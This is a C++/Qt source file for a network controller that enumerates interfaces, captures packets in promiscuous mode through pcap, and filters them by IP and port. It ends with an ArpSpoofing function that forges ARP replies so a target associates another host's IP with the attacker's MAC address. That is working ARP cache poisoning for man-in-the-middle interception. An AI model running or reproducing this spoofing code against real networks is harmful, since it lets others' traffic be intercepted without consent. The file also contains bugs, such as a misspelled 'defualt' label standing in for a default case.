#include "networkcontroller.h"

using namespace std;

NetworkController::NetworkController(QObject *parent)
    : QObject{parent}
{
    GetInterfaceInfo();
    if(!OpenPcap()) return;
}

NetworkController::~NetworkController() {
    for(const auto& pcap : pcaps_)
        pcap_close(pcap);
}

//private

void NetworkController::RecvPacketThreadFunc(NetworkController* nc) const {
    while(1) {
        usleep(10);

        switch(this->status_) {
            case STATUS_INIT: {
                break;
            }
            case STATUS_PAUSE: {
                unique_lock<mutex> t(nc->mtx_);
                nc->cv_.wait(t);
                t.unlock();
                break;
            }
            case STATUS_PLAY: {
                unique_lock<mutex> t(nc->mtx_);
                nc->ReadPacket(nc->cInterfaceInfo_.interfaceName_);
                t.unlock();
                break;
            }
            case STATUS_END: {
                goto END;
                break;
            }
        defualt:
            break;
        }
    }
END:
    return;
}

void NetworkController::play() {
    if(status_ == STATUS_PAUSE) {
        status_ = STATUS_PLAY;
        cv_.notify_all();
    }

    unique_lock<mutex> t(this->mtx_);
    status_ = STATUS_PLAY;
}

void NetworkController::pause() {
    unique_lock<mutex> t(this->mtx_);
    status_ = STATUS_PAUSE;
}

void NetworkController::end() {
    unique_lock<mutex> t(this->mtx_);
    status_ = STATUS_END;
}

bool NetworkController::OpenPcap(const int timeout) {
    try {
        pcap_t* pcap;
        char errBuf[PCAP_ERRBUF_SIZE] {};

        for(const auto& interface : interfaceInfos_) {
            pcap = pcap_open_live(interface.interfaceName_.toStdString().c_str(), BUFSIZ, 1, timeout, errBuf);
            if(pcap == NULL) throw runtime_error("Failed to open pcap : " + string(errBuf));

            pcaps_.push_back(pcap);
        }
    }catch(const exception& e) {
        cerr<<"Create networkController : "<<e.what()<<endl;
        return false;
    }

    return true;
}

void NetworkController::GetInterfaceInfo() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    try {
        if(sock < 0)
            throw runtime_error("Failed to creat socket");

        ifconf ifConfig{};
        char buffer[1024];

        ifConfig.ifc_len = sizeof(buffer);
        ifConfig.ifc_buf = buffer;

        if(ioctl(sock, SIOCGIFCONF, &ifConfig) == -1)
            throw runtime_error("Failed to set ioctl");

        int interfaceCnt = ifConfig.ifc_len / sizeof(ifreq);

        InterfaceInfo info{};


        if(interfaceCnt > 0) {
            for(int idx = 0; idx < interfaceCnt; idx++) {
                //interface name
                info.interfaceName_ = ifConfig.ifc_ifcu.ifcu_req[idx].ifr_ifrn.ifrn_name;
                if(ioctl(sock, SIOCGIFHWADDR, &ifConfig.ifc_ifcu.ifcu_req[idx]) == -1)
                    throw runtime_error("Failed to set ioctl");
                //mac-address
                info.mac_ = reinterpret_cast<u_char*>(ifConfig.ifc_ifcu.ifcu_req[idx].ifr_ifru.ifru_hwaddr.sa_data);

                interfaceInfos_.push_back(info);
            }
        }
    }
    catch(const exception& e) {
        cerr<<"GetInterfaceInfo : "<<e.what() <<endl;
        cerr<<"Error : "<< errno <<" (" << strerror(errno)<<")"<<endl;
    }


    close(sock);
}


Mac NetworkController::GetMac(const QString& interface, const QString targetIP) {
    Mac ret{};
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    try {
        if(sock < 0)
            throw runtime_error("Failed to create socket");

        arpreq req{};

        memcpy(req.arp_dev, interface.toStdString().c_str(), sizeof(req.arp_dev));

        req.arp_pa.sa_family = AF_INET;
        inet_pton(AF_INET, targetIP.toStdString().c_str(), &reinterpret_cast<sockaddr_in*>(&req.arp_pa)->sin_addr);

        if(ioctl(sock, SIOCGARP, &req) == -1)
            throw runtime_error("Failed to set ioctl");

        ret = reinterpret_cast<u_char*>(req.arp_ha.sa_data);

    }catch(const exception& e) {
        cerr<<"GetMacAddress : "<<e.what()<<endl;
        cerr<<"Error : "<<errno<<" ("<<strerror(errno)<<")"<<endl;
    }

    close(sock);

    return ret;
}

bool NetworkController::ReadPacket(const QString& interface) {
    RecvData recvData{};

    pcap_t* pcap = nullptr;

    for(int i=0; i<interfaceInfos_.size(); i++)
        if(interfaceInfos_.at(i).interfaceName_ == interface) pcap = pcaps_.at(i);

    if(pcap == nullptr) return false;

    if(pcap_next_ex(pcap, &recvData.header, (const uchar**)&recvData.buf) != 1)
        return false;

    unique_lock<mutex> t(mtx_);
    recvDatas_.push_back(recvData);

    return true;
}

vector<uint8_t*> NetworkController::GetPacket(const QString interface, const uint16_t etherType, const QString ip, const IpHdr::PROTOCOL_ID_TYPE type, const uint16_t port) {
    vector<uint8_t*> packets;

    unique_lock<mutex> t(mtx_);
    for(const auto& data : recvDatas_) {
        //arp header size : 28
        if(data.header->caplen < sizeof(EthHdr) + sizeof(IpHdr)) continue;

        EthHdr* etherHeader = reinterpret_cast<EthHdr*>(data.buf);

        if(etherHeader->type() != etherType) continue;

        switch(etherHeader->type()) {
        case EthHdr::Arp: {
            packets.push_back(data.buf);
            break;
        }
        case EthHdr::Ip4: {
            IpHdr* ipHeader = reinterpret_cast<IpHdr*>(data.buf + sizeof(EthHdr));
            if(ipHeader->sip().compare(ip.toStdString()) == 0 || ipHeader->dip().compare(ip.toStdString()) == 0) {
                if(ipHeader->protocolId_ != type) continue;

                switch(ipHeader->protocolId_) {
                case IpHdr::PROTOCOL_ID_TYPE::IPv4: {
                    packets.push_back(data.buf);
                    break;
                }
                case IpHdr::PROTOCOL_ID_TYPE::ICMP: {
                    packets.push_back(data.buf);
                    break;
                }
                case IpHdr::PROTOCOL_ID_TYPE::TCP: {
                    TcpHdr* tcpHeader = reinterpret_cast<TcpHdr*>(data.buf + sizeof(EthHdr) + ipHeader->len());
                    if(port == tcpHeader->sPort() || port == tcpHeader->dPort())
                        packets.push_back(data.buf);

                    break;
                }
                defualt:
                    break;
                }
            }
            break;
        }

        default:
            break;
        }
    }

    recvDatas_.clear();

    return packets;
}


//public
vector<QString> NetworkController::GetInterfaces() {
    vector<QString> ret;

    for(const auto& info : interfaceInfos_)
        ret.push_back(info.interfaceName_);

    return ret;
}

QString NetworkController::GetCurrentInterface() {
    unique_lock<mutex> t(mtx_);
    return cInterfaceInfo_.interfaceName_;
}

bool NetworkController::SetCurrentInterface(const QString interface) {
    unique_lock<mutex> t(mtx_);

    for(const auto& info : interfaceInfos_) {
        if(info.interfaceName_ == interface) {
            cInterfaceInfo_ = info;
            return true;
        }
    }

    return false;
}

bool NetworkController::ArpSpoofing(const QString interface, const QString senderIP,const QString targetIP) {
    Mac targetMac = GetMac(interface, targetIP);

    try {
        if(targetMac.isNull()) throw runtime_error("target mac is null");

        EthArpPacket packet{};

        packet.eth_.dmac_ = targetMac;
        packet.arp_.tmac_ = targetMac;

        for(const auto& info : interfaceInfos_) {
            if(info.interfaceName_ == interface) {
                packet.eth_.smac_ = info.mac_;
                packet.arp_.smac_ = info.mac_;
            }
        }

        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.harwareType_ = htons(ArpHdr::ETHERNET);
        packet.arp_.protocolType_ = htons(EthHdr::Ip4);
        packet.arp_.hardwareSize_ = ArpHdr::ETHERNET_LEN;
        packet.arp_.protocolSize_ = ArpHdr::PROTOCOL_LEN;
        packet.arp_.opCode_ = htons(ArpHdr::OpCodeType::Arp_Reply);
        inet_pton(AF_INET, senderIP.toStdString().c_str(), &packet.arp_.sip_);
        inet_pton(AF_INET, targetIP.toStdString().c_str(), &packet.arp_.dip_);

        pcap_t* pcap = nullptr;

        for(int i=0; i<interfaceInfos_.size(); i++)
            if(interfaceInfos_.at(i).interfaceName_ == interface) pcap = pcaps_.at(i);

        if(pcap == nullptr) throw runtime_error("Failed to find pcap opended");

        if(pcap_sendpacket(pcap, reinterpret_cast<u_char*>(&packet), sizeof(EthArpPacket)) == -1)
            throw runtime_error("Failed to send packet : " + string(pcap_geterr(pcap)));



    }catch(const std::exception& e) {
        cerr<<"Failed to ArpSpoofing : "<<e.what()<<endl;
        return false;
    }
    return true;
}

